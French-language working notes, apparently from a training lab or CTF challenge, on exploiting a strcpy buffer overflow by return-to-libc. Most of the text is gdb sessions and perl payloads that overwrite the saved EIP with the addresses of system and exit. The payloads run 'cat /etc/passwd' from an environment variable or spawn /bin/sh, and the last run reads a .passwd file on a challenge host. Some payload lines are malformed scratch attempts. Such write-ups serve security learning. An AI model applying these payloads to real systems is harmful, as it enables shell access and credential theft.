# Return Oriented Programming : Ret2libc

- On charge "cat /etc/passwd" dans une variable d'env
- On utilise un paramètre avec strcopy pour faire un ret2libc vers system et exécuter ce payload

- gdb ex3
- r test
- p system
(gdb) p system
$1 = {int (const char *)} 0xf7dcf910 <__libc_system>

On récupère l'adresse de system


On cherche la variable d'env
```show environment```
Liste les variables

On réucupère l'addresse de la bonne variable d'environnement :
```(gdb) x/s *((char **)environ+18)
0xffffd811:     "pwn_string=cat /etc/passwd"```

On récupère l'addresse de exit pour éviter une erreur:
(gdb) p exit
$3 = {void (int)} 0xf7dbed50 <__GI_exit>


$(perl -e 'print "A"x40 . "\x11\xd8\xff\xff" . "\x10\xf9\xdc\xf7" . "\x50\xed\xdb\xf7"')

<@system><@exit><@"/cat /etc/passwd">
r $(perl -e 'print "B"x28  . "\x10\xf9\xdc\xf7" . "\x50\xed\xdb\xf7". "\x75\xdf\xff\xff"')

r $(perl -e 'print "AAA%AAsAABAA$AAnAACAA-AA"."\x1c\xd8\xff\xff"."AA;AA."\x1c\xd8\xff\xff".AAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"')


env -i MYVAR=10 gdb ./prog
env -i pwn_string="cat /etc/passwd" gdb-gef ./ex3

env = 0xffffdf75



On détermine EIP offset

gdb-peda

pattern create 50
r 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA'
pattern_offset


FUNCTIONNAL
env -i pwn_string="cat /etc/passwd" PWD=/mnt/c/Users/laure/git/buffer-overflow/ex3 ./ex3 $(perl -e 'print "B"x28  . "\x10\xf9\xdc\xf7" . "\x50\xed\xdb\xf7". "\xb3\xdf\xff\xff"')


La faille se trouve ici :

strcpy (message, argv[1]);

Dans un premier temps, dans gdb, on unset LINES et COLUMNS afin d’être dans le même environnement que hors gdb et ne pas avoir de problème avec les adresses (C’est un bon réflexe à avoir)

gdb$ unset env LINES
gdb$ unset env COLUMNS
Ensuite, on peut effectuer un buffer overflow. La sauvegarde de EIP est écrasée après les 32 premiers bytes du buffer.

gdb$ r $(perl -e 'print "A"x32 . "\xef\xbe\xad\xde"')
Your message: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAﾭ?

Program received signal SIGSEGV, Segmentation fault.
Cannot access memory at address 0xdeadbeef
0xdeadbeef in ?? ()
Il suffit alors de faire un retour à la libc. Pour cela, deux informations sont nécessaires. La première, l’adresse de system ensuite l’adresse de la chaine "/bin/sh".

Pour system, on la trouve facilement avec gdb

gdb$ p system
$8 = {<text variable, no debug info>} 0xb7e69060 <system>
Et pour /bin/sh, on peut faire une recherche un peu bourrine pour voir si elle est déjà mappée en mémoire

gdb$ find __libc_start_main,+99999999,"/bin/sh"
0xb7f8ac58
warning: Unable to access target memory at 0xb7fd1160, halting search.
1 pattern found.
Parfait. On a donc nos informations. On va alors réécrire la sauvegarde de EIP avec l’adresse de system. L’adresse suivante dans la pile sera l’adresse de retour de system. Elle ne nous intéresse pas, mais on pourrait très bien prendre l’adresse de exit pour rendre l’exploit plus ... propre

gdb$ p exit
$9 = {<text variable, no debug info>} 0xb7e5cbe0 <exit>
Et enfin, le argv[1] de system qui est l’adresse de /bin/sh

Ce qui nous donne pour l’exploit :

gdb$ r $(perl -e 'print "A"x32 . "\x60\x90\xe6\xb7" . "\xe0\xcb\xe5\xb7" . "\x58\xac\xf8\xb7"')
Your message: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`?????X???
sh-4.2$
Hors gdb, la même chose :

app-systeme-ch33@challenge02:~$ /challenge/app-systeme/ch33/ch33 $(perl -e 'print "A"x32 . "\x60\x90\xe6\xb7" . "\xe0\xcb\xe5\xb7" . "\x58\xac\xf8\xb7"')
Your message: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`?????X???
sh-4.2$ cat .passwd
